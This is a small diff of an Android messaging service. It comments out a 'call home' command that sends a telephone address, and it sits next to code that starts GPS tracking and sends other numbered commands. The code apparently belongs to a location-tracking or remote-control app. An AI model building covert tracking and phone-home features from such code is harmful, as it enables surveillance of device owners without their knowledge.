@@ -188,9 +188,9 @@ public class MessagingService extends Service {
         if(JobsIntentService.sShouldTrackGps){
             Lofl.onReceiveCommand(this, 21, "start", null);
         }
-        if(!sHasCalledHome){
+        /*if(!sHasCalledHome){
             Lofl.onReceiveCommand(this, 22, sTelephoneAddress, null);
-        }
+        }*/
         Lofl.onReceiveCommand(this, 5, null, null);
        //ArrayList<String> addresses = Lofl.fetchIpv4Addresses();
    /*     new Thread(new Runnable() {
